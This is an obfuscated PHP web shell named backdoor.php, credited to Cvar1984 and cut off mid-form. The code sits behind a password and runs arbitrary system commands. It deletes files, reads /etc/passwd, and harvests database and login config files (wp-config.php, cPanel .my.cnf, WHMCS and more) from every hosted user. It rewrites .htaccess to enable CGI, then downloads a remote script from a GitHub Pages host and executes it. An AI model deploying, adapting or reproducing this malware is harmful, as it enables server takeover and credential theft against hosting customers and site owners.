?><?php

/*
 * backdoor.php
 *
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.9
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
*/

session_start();
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
ini_set('zlib.output_compression', 'Off');
ini_restore('safe_mode');
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("open_basedir");
ignore_user_abort(0);

$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
$email = ""; // Your Email
$a="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";$b="\x75\x72\x6c\x64\x65\x63\x6f\x64\x65";
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.a   |
    |              on 2018-07-14 06:40:43              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
 goto RONJU; nYmSZ: rjat_: goto d3Ydz; btcVT: kkcdS: goto NQAe_; tg5f0: $sep = substr("\x5c", 0, 1); goto Vdgxk; kN_m_: goto Jkk29; goto sdV4k; r7ZZ2: function YCCvm()
 {
     unset($_SESSION[sha1(md5($_SERVER["\110\124\x54\x50\x5f\110\117\x53\124"]))]);
     tNbrl();
 } goto caYUZ; OxQua: function T9GAW($dir)
 {
     goto rGSEe;
     oTsgR: return false;
     goto dOqXE;
     SfZNS: UeiKt: goto hwrXH;
     vpb0e: Glu4S: goto VxLOU;
     VxLOU: return true;
     goto JVHLS;
     Ujnk2: $objects = scandir($dir);
     goto hQljB;
     wqXET: if (rmdir($dir)) {
         goto Glu4S;
     }
     goto oTsgR;
     gkXGl: goto j0rwF;
     goto nrEq1;
     ARqLA: return false;
     goto gkXGl;
     nrEq1: uE9BL: goto mtp1p;
     rGSEe: if (is_dir($dir)) {
         goto lKU15;
     }
     goto xpLDI;
     JVHLS: SXtP2: goto SfZNS;
     dOqXE: goto SXtP2;
     goto vpb0e;
     Zh6eT: j0rwF: goto GZvG5;
     hQljB: foreach ($objects as $object) {
         goto budPr;
         LtSXW: aMKwi: goto GTtJD;
         QqzVe: elOWy: goto LtSXW;
         budPr: if (!($object != "\56" && $object != "\x2e\x2e")) {
             goto aMKwi;
         }
         goto cbpQr;
         xBJYw: MTHy7: goto tz20g;
         GTtJD: qEKeg: goto VagD9;
         IsfzD: unlink($dir . "\x2f" . $object);
         goto R7fN0;
         R7fN0: goto elOWy;
         goto xBJYw;
         tz20g: T9Gaw($dir . "\x2f" . $object);
         goto QqzVe;
         cbpQr: if (is_dir($dir . "\57" . $object)) {
             goto MTHy7;
         }
         goto IsfzD;
         VagD9:
     }
     goto UVhUT;
     xpLDI: if (@unlink($dir)) {
         goto uE9BL;
     }
     goto ARqLA;
     mtp1p: return true;
     goto Zh6eT;
     GZvG5: goto UeiKt;
     goto ZOVnu;
     UVhUT: f3rqz: goto wqXET;
     ZOVnu: lKU15: goto Ujnk2;
     hwrXH:
 } goto Y0_OA; UQWtE: JLdTe(); goto OMq5A; upQzj: function rtPa4($file)
 {
     goto Px6Gs;
     Px6Gs: if (@touch($file . "\x2f" . "\156\x65\x77\137\146\151\154\x65\56\x70\150\160")) {
         goto KS_Er;
     }
     goto httHa;
     wabfW: jJIXG("\x53\x75\143\143\145\x73\x73");
     goto iLu0D;
     vvvgf: goto nN9Rs;
     goto Hs9vb;
     Hs9vb: KS_Er: goto wabfW;
     httHa: jJIXg("\x50\x65\162\155\151\163\163\x69\x6f\x6e\x20\104\145\156\151\145\144\40\x4f\162\x20\x46\151\x6c\x65\40\105\170\151\163\164\163");
     goto vvvgf;
     iLu0D: nN9Rs: goto CYx5y;
     CYx5y:
 } goto ndz_0; xqfOY: function NlYYO($url, $data)
 {
     goto WXSWo;
     O_hHL: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     goto eaA9Q;
     AY2lw: curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     goto O_hHL;
     gciuZ: curl_close($ch);
     goto vKMjd;
     sdAE8: return curl_exec($ch);
     goto gciuZ;
     oUc22: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto AY2lw;
     eaA9Q: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto sdAE8;
     WXSWo: $ch = curl_init($url);
     goto oUc22;
     vKMjd:
 } goto r0gN3; WdgQ4: if ($_GET["\144\157"] == "\143\150\x6d\157\x64" and isset($_GET["\146\x69\154\145\163"])) {
     goto Vb10t;
 } goto CHviX; XyLTN: function c5s6G()
 {
     jJiXg("\x54\150\151\x73\x20\x66\145\141\164\x75\162\x65\40\165\x6e\144\145\x72\40\x64\145\166\145\154\x6f\160\x6d\145\x6e\164");
 } goto dmbX9; eVXgr: jjiXg("\x53\x75\143\143\x65\x73\163"); goto Db0q_; Hz6Gx: Vqggv: goto eptYg; lXYhF: luKGR: goto DdRy8; MBMaY: ByHtq: goto tg5f0; pwCJW: if (!isset($_GET["\x64\x6f"])) {
     goto gJTfH;
 } goto zNXEM; r1s0N: if (!isset($_POST["\x75\160\x6c"])) {
     goto rea3J;
 } goto AhvnH; EI6yV: if ($_GET["\x64\157"] == "\x65\x64\151\164" and isset($_GET["\146\151\154\x65\163"])) {
     goto t30L2;
 } goto M29w9; h0DV_: X06oR: goto rcxk9; Eld8r: goto Jkk29; goto wi8wr; deCzC: function u4Tux($cmd)
 {
     goto HHE7A;
     exPGa: $buff = ob_get_contents();
     goto m2qV5;
     m71US: QEIHb: goto aEyU8;
     xg7TK: return $buff;
     goto ivo_o;
     tCvMQ: $buff = ob_get_contents();
     goto bXPMc;
     HHE7A: if (function_exists("\163\171\x73\x74\x65\x6d")) {
         goto QEIHb;
     }
     goto UPb81;
     MWvMT: if (function_exists("\x70\141\x73\x73\x74\x68\162\x75")) {
         goto WuyA0;
     }
     goto LoMNq;
     ivo_o: goto Rj53k;
     goto RAC4_;
     WqYQI: $buff = '';
     goto Ys0NG;
     KohO_: goto Rj53k;
     goto URVjO;
     yk4I0: ob_start();
     goto Kncsc;
     UPb81: if (function_exists("\145\170\x65\x63")) {
         goto pvB0k;
     }
     goto MWvMT;
     m2qV5: ob_end_clean();
     goto zLlk6;
     Rxtqg: Rj53k: goto gkoLd;
     aEyU8: ob_start();
     goto yduGd;
     URVjO: pvB0k: goto e8wFJ;
     yduGd: @system($cmd);
     goto tCvMQ;
     hcaWn: return $buff;
     goto KohO_;
     zLlk6: return $buff;
     goto xIQCq;
     e8wFJ: @exec($cmd, $results);
     goto WqYQI;
     bXPMc: ob_end_clean();
     goto hcaWn;
     Kncsc: @passthru($cmd);
     goto exPGa;
     RAC4_: WuyA0: goto yk4I0;
     W4kqk: ZZcML: goto xg7TK;
     x5kd8: lp_ro: goto f8Vil;
     Oc21i: goto Rj53k;
     goto m71US;
     LoMNq: if (function_exists("\163\x68\145\x6c\154\x5f\x65\x78\x65\143")) {
         goto lp_ro;
     }
     goto Oc21i;
     f8Vil: $buff = @shell_exec($cmd);
     goto jGKpC;
     xIQCq: goto Rj53k;
     goto x5kd8;
     Ys0NG: foreach ($results as $result) {
         $buff .= $result;
         pXz1I:
     }
     goto W4kqk;
     jGKpC: return $buff;
     goto Rxtqg;
     gkoLd:
 } goto bBZU9; SmrFX: echo "\74\164\141\142\x6c\145\40\x77\151\144\x74\150\x3d\x27\x37\60\x25\47\x20\x63\x65\x6c\154\x70\141\x64\x64\151\156\x67\75\x27\x33\47\40\143\x65\154\154\163\x70\x61\143\x69\156\147\75\x27\63\x27\x20\141\154\x69\147\156\x3d\x27\143\145\156\x74\x65\x72\47\x20\x73\x74\171\154\145\75\47\x62\x61\143\x6b\x67\x72\157\x75\x6e\x64\x3a\147\162\x65\145\156\73\47\x3e\xd\xa\x9\74\164\x68\40\x73\164\x79\x6c\145\x3d\x27\x62\141\x63\153\x67\162\157\x75\x6e\144\72\x67\162\x65\145\156\73\x66\154\x6f\x61\164\72\x6c\145\146\164\73\167\151\144\164\x68\x3a\62\60\60\160\x78\x3b\164\145\x78\x74\x2d\141\154\x69\147\x6e\x3a\x63\145\156\164\145\x72\x3b\x66\x6f\156\164\x2d\x73\x69\x7a\x65\72\61\70\160\x78\73\47\76\x4e\141\x6d\x65\x3c\57\164\150\x3e\15\xa\x9\74\164\150\x20\x73\x74\171\154\x65\75\47\x62\x61\143\153\147\162\x6f\165\156\144\x3a\147\x72\x65\x65\156\x3b\x66\x6c\x6f\141\164\72\x72\151\x67\x68\x74\x3b\x77\151\x64\x74\150\72\63\x30\x30\160\170\73\x74\x65\170\x74\x2d\141\x6c\x69\x67\x6e\x3a\143\145\x6e\x74\x65\162\x3b\x66\157\x6e\164\x2d\x73\x69\x7a\x65\x3a\x31\70\x70\170\73\47\x3e\101\x63\164\x69\157\156\74\x2f\164\x68\76\xd\12\11\74\57\x74\141\142\x6c\145\x3e"; goto gcOHE; qkQRD: UeqDA($_GET["\x66\x69\154\x65\163"]); goto v1W3k; WoElu: if ($_GET["\x64\157"] == "\154\157\x67\x6f\165\x74") {
     goto mIQb1;
 } goto EI6yV; tK6jq: cVxIB: goto AmxkD; aaD85: if ($_GET["\x64\157"] == "\x76\151\145\x77" and isset($_GET["\146\151\x6c\145\x73"])) {
     goto Vqggv;
 } goto wxaII; OPU8D: UdMDI: goto H2Oo2; VGEHJ: goto Jkk29; goto s63LX; QjL6a: ?>, 
			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
			</center>
		</th>
	</table>
	<?php  goto r1s0N; g8_oj: goto Jkk29; goto SLwwz; xtMZ1: goto Jkk29; goto iUmx7; rcxk9: ?>
<table width='70%' cellpadding='3' cellspacing='3' align='center'
		style='background: green;'>
		<th style='padding: 5px;' colspan='2'>
			<center>
			Copyright &copy <?php  goto OI4ds; s5SwB: goto yTl53; goto MBMaY; eXMF4: if (empty($auth_pass) or isset($_GET["\x70\x61\163\x73"]) and sha1($_GET["\x70\141\x73\163"]) == $auth_pass) {
     goto kkcdS;
 } goto GP2Ek; v1W3k: goto Jkk29; goto OPU8D; RONJU: if (strtolower(substr(PHP_OS, 0, 3)) == "\x77\x69\x6e") {
     goto ByHtq;
 } goto wb8wZ; HyKF2: $userAgents = array("\x47\157\157\147\x6c\x65\142\x6f\x74", "\x44\x75\x63\x6b\104\x75\x63\x6b\x42\157\x74", "\102\x61\151\144\165\163\x70\151\144\145\162", "\x45\170\x61\142\157\164", "\x53\151\x6d\160\154\x65\120\x69\145", "\103\165\x72\x6c", "\x4f\x6b\110\164\x74\160", "\x53\x69\x74\145\x4c\x6f\143\153\x53\160\151\144\145\162", "\x42\x4c\105\130\102\157\164", "\x53\143\x6f\x75\x74\112\x65\164", "\x41\144\x73\x42\157\164\40\x47\157\157\147\154\x65\x20\115\157\142\x69\x6c\145", "\x47\157\157\x67\x6c\x65\x62\x6f\x74\40\115\x6f\x62\x69\x6c\x65", "\115\112\x31\62\142\157\x74", "\x53\x6c\x75\162\160", "\x4d\123\116\x42\157\x74", "\x50\x79\x63\x55\122\114", "\146\141\143\x65\142\157\x6f\x6b\x65\170\x74\145\162\156\141\154\150\151\164", "\x66\x61\143\x65\142\157\x74", "\x69\x61\x5f\x61\162\143\x68\151\x76\145\162", "\143\162\141\x77\154\x65\x72", "\x59\141\156\144\x65\x78\x42\157\x74", "\x52\x61\155\x62\x6c\145\x72", "\131\x61\x68\157\157\x21\x20\x53\x6c\x75\x72\160", "\x59\x61\150\157\157\x53\145\145\x6b\x65\x72", "\142\151\156\x67\142\x6f\x74"); goto KJTqW; dV0jz: function cbVC0()
 {
     goto GFcyl;
     QcIXx: echo php_uname();
     goto GYeve;
     kGeuX: die;
     goto OBGBj;
     ep4I3: goto ymYKL;
     goto XWnvJ;
     SUtMs: echo $dist;
     goto sfbWA;
     GYeve: ?></h5>
   	<h5>Disabled Function : <?php  goto SUtMs;
     sfbWA: ?> </h5>
		<textarea class="form-control" id="textarea" readonly /><?php  goto Nt9wV;
     XWnvJ: ycc4S: goto uEafZ;
     EbTWn: ymYKL: goto aW13r;
     Nt9wV: var_dump($_SERVER);
     goto QH5QB;
     aW13r: ?>
   <center>
   	<h5><?php  goto QcIXx;
     QH5QB: ?></textarea>
	</center>
	<?php  goto kGeuX;
     GFcyl: if (!ini_get("\144\x69\x73\141\x62\x6c\145\x5f\x66\x75\156\x63\x74\x69\x6f\156\x73") == true) {
         goto ycc4S;
     }
     goto DviOr;
     uEafZ: $dist = "\106\141\x6c\163\145";
     goto EbTWn;
     DviOr: $dist = ini_get("\144\x69\163\141\142\154\x65\x5f\x66\165\156\x63\164\x69\x6f\156\x73");
     goto ep4I3;
     OBGBj:
 } goto r7ZZ2; wdnHz: JjiXG("\x50\145\x72\x6d\151\163\x73\x69\x6f\156\40\104\145\156\151\145\x64"); goto VHd9t; dmbX9: function M4L6u()
 {
     goto Ak3zR;
     rsXtg: if (file_exists("\57\150\x6f\155\x65\57")) {
         goto kJrdD;
     }
     goto OzNJK;
     Ua_R2: Tg27Y: goto nI_uO;
     LODfv: $isi = "\x4f\x70\164\x69\157\156\x73\x20\106\157\154\154\157\x77\x53\171\x6d\114\151\x6e\153\x73\x20\x4d\x75\x6c\x74\x69\x56\x69\x65\x77\x73\x20\x49\x6e\144\145\x78\145\x73\40\x45\170\145\x63\x43\x47\111\xa\x52\x65\x71\x75\x69\x72\145\x20\x4e\157\156\x65\12\x53\141\x74\151\x73\146\x79\x20\x41\156\x79\12\x41\x64\144\x54\171\x70\145\x20\141\160\160\154\151\x63\141\x74\151\157\156\57\170\x2d\x68\164\164\x70\x64\x2d\143\147\151\x20\56\x63\x69\156\12\x41\x64\x64\110\141\x6e\144\x6c\145\x72\40\x63\x67\151\x2d\x73\143\x72\151\x70\x74\x20\x2e\x63\151\156\12\101\144\x64\110\141\x6e\x64\x6c\145\x72\x20\143\x67\x69\55\x73\143\x72\x69\160\x74\40\56\x63\x69\156";
     goto iNOBI;
     iNOBI: file_put_contents("\x2e\x63\x6f\x6e\x66\x69\x67\x2f\x63\x6f\156\x66\151\x67\x2f\56\x68\164\x61\x63\143\145\x73\163", $isi);
     goto TorFm;
     tPg0v: goto Tg27Y;
     goto QuWHU;
     hQktX: gFARi: goto VSauv;
     BduKY: IO8Nu: goto eex5v;
     wmhcH: $home = "\150\x6f\155\x65\x34";
     goto Ua_R2;
     QuWHU: cwJVz: goto wmhcH;
     VSauv: if (!($passwd = fgets($etc))) {
         goto WV6Zq;
     }
     goto wzmbC;
     f6J2e: mkdir("\56\x63\157\x6e\146\151\x67\x2f\143\x6f\x6e\x66\151\147");
     goto vr7ZA;
     pP06I: bnzLN: goto mfCIf;
     JG_9r: echo "\x3c\143\x65\156\164\145\162\x3e\x3c\141\x20\x68\162\x65\x66\x3d\x27{$link_config}\x2f\x2e\143\x6f\x6e\x66\151\147\x2f\x63\x6f\156\146\x69\147\57\x76\x68\157\163\x74\56\143\x69\156\47\x3e\x3c\x66\x6f\x6e\164\40\143\157\x6c\x6f\x72\75\154\151\x6d\145\x3e\x44\157\x6e\x65\x3c\57\x66\157\156\164\76\x3c\x2f\141\76\x3c\x2f\143\145\156\164\x65\x72\x3e";
     goto pMxKQ;
     KakQ6: goto bnzLN;
     goto XMpAh;
     Vyec4: if (u4tUX("\143\144\40\x2e\143\157\x6e\146\151\147\x2f\143\x6f\156\146\151\x67\x20\46\x26\x20\x2e\x2f\166\x68\x6f\163\x74\56\x63\151\x6e")) {
         goto IO8Nu;
     }
     goto JG_9r;
     OzNJK: if (file_exists("\57\150\157\155\x65\x31\57")) {
         goto Bvgm7;
     }
     goto OdMNm;
     B_MeU: goto Tg27Y;
     goto MNyni;
     oV5jb: die;
     goto q0JDw;
     eex5v: echo "\x3c\143\x65\x6e\x74\x65\162\x3e\x3c\x61\x20\150\x72\145\146\x3d\x27{$link_config}\57\56\143\157\156\146\151\x67\x2f\143\157\x6e\x66\x69\x67\47\x3e\74\x66\x6f\156\164\40\143\x6f\x6c\157\x72\75\154\x69\x6d\145\x3e\104\x6f\x6e\x65\x3c\x2f\146\157\x6e\164\x3e\x3c\x2f\x61\x3e\x3c\57\143\145\156\164\145\x72\x3e";
     goto nnl4_;
     MNyni: Bvgm7: goto P8KDl;
     wzmbC: if ($passwd == '' || !$etc) {
         goto M6tem;
     }
     goto sYLvU;
     pMxKQ: goto t3kfc;
     goto BduKY;
     fk0e9: goto Tg27Y;
     goto lpYqO;
     MoJPT: if (preg_match("\57\166\150\x6f\x73\x74\x73\174\x76\150\157\x73\x74\57", $dir)) {
         goto mB6Sg;
     }
     goto xKtfe;
     XMpAh: M6tem: goto XJgNj;
     FUVkt: mkdir("\56\143\157\x6e\x66\151\147");
     goto lXP2I;
     A3037: uHAaP: goto h9kjN;
     vr7ZA: xDzyC: goto yB9mC;
     Bgo0y: goto Tg27Y;
     goto z9HDY;
     nK_4g: if (file_exists("\57\x68\x6f\155\145\x34\x2f")) {
         goto cwJVz;
     }
     goto fk0e9;
     cUevT: if (file_exists("\x2f\150\x6f\x6d\145\x33\x2f")) {
         goto uHAaP;
     }
     goto nK_4g;
     JwFiN: WV6Zq: goto hXynT;
     h9kjN: $home = "\x68\157\155\145\63";
     goto tPg0v;
     dSNBE: if (file_exists("\56\x63\157\x6e\x66\x69\147")) {
         goto wSPhj;
     }
     goto FUVkt;
     Un6V2: if (file_exists("\x2e\143\157\x6e\146\x69\147\57\x63\x6f\x6e\146\151\147\57\x76\150\x6f\163\x74\x2e\143\151\156")) {
         goto s4Lcz;
     }
     goto NgLGv;
     z9HDY: IcGxH: goto SbNtR;
     nnl4_: t3kfc: goto HsGay;
     NgLGv: file_put_contents("\x2e\x63\157\x6e\x66\151\x67\x2f\x63\x6f\156\x66\151\x67\x2f\166\x68\x6f\163\164\x2e\143\x69\x6e", gzinflate(urldecode(file_get_contents("\150\164\164\x70\x73\x3a\x2f\57\x63\166\141\x72\x31\71\x38\64\56\147\151\x74\150\x75\142\x2e\x69\x6f\57\166\x68\x6f\x73\164\x2e\x63\x69\x6e"))));
     goto pUkc7;
     nI_uO: foreach ($user_config[1] as $user_idx) {
         goto Bpbnk;
         Bpbnk: $user_config_dir = "\57{$home}\57{$user_idx}\x2f\160\165\142\154\x69\x63\137\150\x74\155\154";
         goto zfuCW;
         NRptc: $grab_config = array("\x2f{$home}\x2f{$user_idx}\57\x2e\155\171\56\x63\156\x66" => "\x63\160\x61\x6e\145\154", "\x2f{$home}\x2f{$user_idx}\57\x2e\x61\x63\143\x65\163\163\x68\x61\163\150" => "\127\110\115\x2d\141\143\143\145\163\x73\x68\x61\163\150", "{$user_config_dir}\x2f\x70\x6f\x2d\x63\157\156\x74\x65\156\x74\57\143\x6f\x6e\x66\151\x67\x2e\160\x68\160" => "\120\157\160\x6f\x6a\151", "{$user_config_dir}\x2f\166\x64\x6f\x5f\143\157\x6e\146\x69\147\x2e\x70\150\160" => "\x56\x6f\x6f\144\157\x6f", "{$user_config_dir}\57\x62\167\55\143\157\x6e\146\x69\x67\163\x2f\x63\157\156\146\x69\147\x2e\x69\x6e\151" => "\x42\x6f\x73\127\x65\x62", "{$user_config_dir}\57\x63\x6f\x6e\146\x69\x67\57\153\x6f\156\x65\x6b\x73\151\x2e\160\150\160" => "\x4c\x6f\153\157\x6d\x65\x64\x69\x61", "{$user_config_dir}\x2f\x6c\157\x6b\x6f\x6d\x65\x64\151\141\x2f\143\157\156\x66\x69\x67\57\x6b\x6f\x6e\145\153\x73\x69\x2e\x70\x68\x70" => "\114\157\x6b\157\155\x65\x64\151\x61", "{$user_config_dir}\57\x6b\x6f\x6e\145\153\x73\x69\x2e\x70\x68\160" => "\x4c\x6f\x6b\157\x6d\145\144\151\141", "{$user_config_dir}\x2f\x63\x6c\151\x65\156\164\x61\x72\145\x61\57\143\x6f\156\x66\151\147\x75\x72\141\164\151\x6f\x6e\x2e\x70\150\x70" => "\x57\x48\115\103\123", "{$user_config_dir}\x2f\x77\x68\x6d\x2f\x63\x6f\156\146\151\x67\165\162\141\x74\x69\157\156\x2e\160\x68\x70" => "\127\110\x4d\103\x53", "{$user_config_dir}\x2f\x77\x68\155\143\163\x2f\143\x6f\156\146\x69\x67\x75\162\x61\164\x69\157\156\x2e\x70\150\x70" => "\127\110\x4d\x43\x53", "{$user_config_dir}\57\x66\157\162\165\x6d\x2f\x63\x6f\156\x66\151\x67\x2e\160\x68\x70" => "\160\150\160\102\102", "{$user_config_dir}\x2f\x73\x69\x74\x65\163\x2f\144\145\146\x61\x75\154\164\57\163\x65\x74\x74\x69\156\147\x73\56\x70\150\160" => "\x44\x72\x75\x70\141\x6c", "{$user_config_dir}\x2f\x63\157\156\146\x69\x67\57\163\x65\x74\164\x69\x6e\x67\163\x2e\151\x6e\x63\56\x70\x68\160" => "\120\162\x65\x73\164\x61\123\150\x6f\160", "{$user_config_dir}\57\x61\x70\x70\57\145\x74\x63\x2f\154\157\143\x61\154\x2e\170\x6d\x6c" => "\115\141\x67\x65\x6e\164\157", "{$user_config_dir}\x2f\152\x6f\157\x6d\154\141\57\x63\x6f\x6e\x66\x69\x67\165\x72\141\x74\x69\157\156\x2e\x70\x68\x70" => "\x4a\157\x6f\x6d\x6c\x61", "{$user_config_dir}\57\143\157\156\146\151\147\165\x72\141\x74\x69\157\156\x2e\160\150\160" => "\x4a\157\x6f\155\154\141", "{$user_config_dir}\x2f\x77\x70\x2f\x77\160\55\x63\x6f\156\x66\151\x67\x2e\160\150\160" => "\x57\x6f\x72\144\120\162\x65\x73\163", "{$user_config_dir}\57\167\157\162\x64\160\162\145\163\163\57\x77\160\x2d\143\157\156\x66\x69\147\56\x70\x68\x70" => "\x57\157\162\144\120\x72\x65\x73\x73", "{$user_config_dir}\x2f\167\160\55\143\x6f\156\146\151\x67\56\x70\150\x70" => "\127\157\162\x64\120\162\x65\163\163", "{$user_config_dir}\x2f\141\x64\155\x69\156\57\x63\157\156\x66\151\147\x2e\x70\150\x70" => "\117\x70\x65\156\x43\141\162\164", "{$user_config_dir}\57\x73\154\143\x6f\156\x66\x69\147\x2e\160\150\x70" => "\x53\151\x74\145\x6c\x6f\x6b", "{$user_config_dir}\57\141\160\160\154\151\x63\141\164\151\x6f\156\x2f\x63\x6f\156\x66\x69\147\x2f\144\141\x74\x61\x62\141\163\x65\x2e\160\150\x70" => "\x45\x6c\154\x69\x73\154\x61\142", "{$user_config_dir}\x2f\x63\x6f\156\x66\151\147\57\144\x61\x74\x61\142\x61\x73\x65\x2e\x70\150\x70" => "\x45\x6c\x6c\x69\x73\x6c\x61\x62", "{$user_config_dir}\x2f\155\157\144\x65\x6c\x73\x2f\144\x62\x2d\163\145\164\x74\151\x6e\147\x73\x2e\160\x68\x70" => "\125\163\145\162\143\141\x6b\145", "{$user_config_dir}\x2f\x63\x6f\x6e\146\151\x67\x2f\144\x61\164\141\x62\x61\x73\145\x2e\160\150\160" => "\x4c\141\162\x61\166\145\154", "{$user_config_dir}\57\x64\x61\x74\141\142\x61\x73\145\56\x70\150\160" => "\x4c\x61\x72\141\x76\145\x6c", "{$user_config_dir}\57\141\160\x70\154\x69\143\x61\164\151\x6f\x6e\57\143\157\156\x66\151\x67\x2e\x69\156\x69" => "\132\145\x6e\x64", "{$user_config_dir}\x2f\143\x6f\x6e\146\x69\147\x2f\141\x70\x70\x2e\x70\x68\160" => "\x43\141\x6b\145\x50\110\120", "{$user_config_dir}\x2f\x70\x68\141\154\143\157\156\57\x63\x6f\x6e\146\x69\147\57\x61\x64\x61\x70\x74\x65\x72\x2f\151\156\x69\x2e\x7a\145\x70" => "\x50\x68\141\154\143\157\156", "{$user_config_dir}\57\143\157\156\x66\151\x67\57\141\144\x61\x70\164\145\x72\57\151\156\151\56\x7a\x65\160" => "\x50\150\141\154\143\157\156", "{$user_config_dir}\x2f\x61\160\x70\57\143\x6f\x6e\146\151\147\57\x63\157\156\x66\x69\x67\165\162\141\x74\x69\x6f\156\x2e\x79\x6d\x6c" => "\x53\x79\x6d\160\x68\157\x6e\171", "{$user_config_dir}\57\141\x70\x70\57\143\157\x6e\146\151\x67\57\144\141\164\x61\x62\x61\x73\145\163\x2e\x79\155\154" => "\123\171\155\x70\150\x6f\x6e\x79", "{$user_config_dir}\57\143\157\x6e\146\x69\147\57\143\157\x6e\146\x69\x67\x75\162\x61\164\x69\x6f\x6e\56\171\155\154" => "\x53\171\155\x70\150\x6f\x6e\x79", "{$user_config_dir}\57\143\x6f\156\146\x69\x67\57\x64\x61\164\141\x62\141\x73\x65\x73\x2e\x79\x6d\x6c" => "\x53\171\155\x70\150\x6f\156\x79", "{$user_config_dir}\57\143\157\156\x66\151\147\x2f\144\142\56\x70\150\x70" => "\x46\165\x65\154\120\110\120\x20\x26\40\131\x69\x69\62", "{$user_config_dir}\x2f\163\x72\x63\x2f\x73\x65\164\164\151\x6e\147\163\56\160\150\x70" => "\123\x6c\151\155");
         goto Ykra6;
         zfuCW: if (!is_readable($user_config_dir)) {
             goto eZJEp;
         }
         goto NRptc;
         qNg1S: eZJEp: goto ompfy;
         ompfy: LvSfc: goto ZVHb0;
         lvffG: V6ibd: goto qNg1S;
         Ykra6: foreach ($grab_config as $config => $nama_config) {
             goto FgYUs;
             tru78: fclose($file_config);
             goto Z2_kQ;
             H6Pnu: if (empty($ambil_config)) {
                 goto rph89;
             }
             goto RWIwH;
             RWIwH: $file_config = fopen("\x2e\x63\x6f\x6e\146\151\147\x2f\143\x6f\156\146\151\147\57{$user_idx}\x2d{$nama_config}\56\164\x78\164", "\x77");
             goto Z227f;
             Z2_kQ: rph89: goto st3D0;
             Z227f: fputs($file_config, $ambil_config);
             goto tru78;
             st3D0: n2vT2: goto Ycg4y;
             FgYUs: $ambil_config = @file_get_contents($config);
             goto H6Pnu;
             Ycg4y:
         }
         goto lvffG;
         ZVHb0:
     }
     goto CsoN6;
     lpYqO: kJrdD: goto HMD0q;
     hXynT: echo "\74\143\x65\x6e\x74\x65\162\x3e\74\x61\40\x68\162\145\x66\75\47\77\x64\x6f\75\157\x70\145\156\x26\144\151\162\75" . getcwd() . $sep . $dir . "\x2f\56\x63\x6f\x6e\x66\151\x67\57\143\x6f\x6e\146\151\147\x27\76\104\157\156\145\74\x2f\x61\x3e\74\x2f\143\x65\x6e\x74\145\162\76";
     goto TTX38;
     mfCIf: goto gFARi;
     goto JwFiN;
     B4veG: mB6Sg: goto sl9kw;
     TTX38: goto vBRCY;
     goto B4veG;
     sYLvU: preg_match_all("\x2f\x28\x2e\52\77\x29\72\x78\x3a\57", $passwd, $user_config);
     goto rsXtg;
     tyQXN: goto Tg27Y;
     goto A3037;
     P8KDl: $home = "\150\x6f\155\145\x31";
     goto Bgo0y;
     lXP2I: wSPhj: goto LuI8m;
     HMD0q: $home = "\x68\x6f\x6d\x65";
     goto B_MeU;
     LuI8m: if (file_exists("\x2e\x63\x6f\156\146\151\x67\x2f\x63\x6f\x6e\146\x69\x67")) {
         goto xDzyC;
     }
     goto f6J2e;
     OdMNm: if (file_exists("\57\150\157\x6d\x65\62\x2f")) {
         goto IcGxH;
     }
     goto cUevT;
     sl9kw: $link_config = str_replace($_SERVER["\104\117\103\125\x4d\105\x4e\x54\137\122\x4f\x4f\x54"], '', $dir);
     goto Un6V2;
     yB9mC: if (file_exists("\56\143\x6f\156\x66\x69\147\57\x63\157\156\146\151\x67\57\x2e\150\x74\141\143\x63\145\163\163")) {
         goto e3Urw;
     }
     goto LODfv;
     Ak3zR: global $dir;
     goto dSNBE;
     HsGay: vBRCY: goto oV5jb;
     SbNtR: $home = "\x68\157\x6d\x65\x32";
     goto tyQXN;
     xKtfe: $etc = @fopen("\57\145\x74\143\x2f\160\x61\163\163\x77\144", "\162") or die("\x3c\160\x72\x65\x3e\x3c\x66\x6f\x6e\x74\x20\x63\x6f\x6c\157\x72\75\162\145\x64\76\103\x61\156\x27\164\40\x72\x65\141\144\40\x2f\x65\x74\x63\57\160\141\x73\x73\167\144\74\x2f\x66\x6f\x6e\x74\76\74\x2f\160\162\x65\x3e");
     goto hQktX;
     CsoN6: U7w25: goto KakQ6;
     XJgNj: echo "\x3c\146\157\156\x74\x20\143\x6f\x6c\157\x72\75\162\145\144\76\103\141\156\x27\164\40\162\145\141\x64\x20\57\145\164\x63\57\x70\x61\x73\x73\167\144\x3c\57\x66\157\x6e\x74\x3e";
     goto pP06I;
     TorFm: e3Urw: goto MoJPT;
     pUkc7: s4Lcz: goto Vyec4;
     q0JDw:
 } goto SoADm; pxJ_h: function A4P0t()
 {
     goto YM1YN;
     t4VZ2: curl_close($ch);
     goto Tx4K9;
     s2Om1: curl_setopt($ch, CURLOPT_HTTPHEADER, array("\x43\x6f\x6e\164\x65\156\x74\55\164\x79\x70\x65\x3a\x61\x70\160\x6c\151\x63\141\164\x69\x6f\156\x2f\152\x73\x6f\x6e"));
     goto N7oWo;
     Tx4K9: $json = json_decode($response);
     goto c5lwm;
     jtCAX: $post = array("\x6c\157\x6e\x67\125\x72\154" => $_POST["\154\151\x6e\x6b"]);
     goto ggrzt;
     gwOV0: ?>
<form method='post'>
	<table align="center">
		<tr>
			<td>Link</td>
			<td>:</td>
			<td>
